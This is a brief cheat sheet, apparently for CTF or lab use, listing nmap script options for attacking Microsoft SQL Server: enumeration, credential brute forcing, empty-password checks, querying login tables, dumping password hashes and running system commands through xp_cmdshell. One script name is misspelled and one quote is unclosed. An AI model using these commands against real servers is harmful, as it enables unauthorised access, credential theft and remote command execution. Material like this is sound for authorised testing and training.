# MSSQL

## Get info about mssql 
```bash
--script ms-sql-info
```

## Get ntlm info about mssql 
```bash
--script ms-sql-ntlm-info 
--script-args mssql.instance-port=1433
```

## Brute force
```bash
--script ms-sql-brute 
--script-args userdb=[userfile],passdb=[passfile]
```

## Empty password
```bash
--script ms-sql-empty-password
```

## Execute query
```bash
--script ms-sql-query 
--script-args mssql.username=[name],mssql.password=[pass],ms-sql-query.query="SELECT * FROM master..syslogins"
```

## dump hashes
```bash
--script ms-sql-dump-hahes 
--script-args mssql.username=[name],mssql.password=[pass]
```

## Execute query
```bash
--script ms-sql-xp-cmdshell
--script-args mssql.username=[name],mssql.password=[pass],ms-sql-xp-cmdshell.cmd="ipconfig"

--script-args mssql.username=[name],mssql.password=[pass],ms-sql-xp-cmdshell.cmd="type C:\flag.txt
```





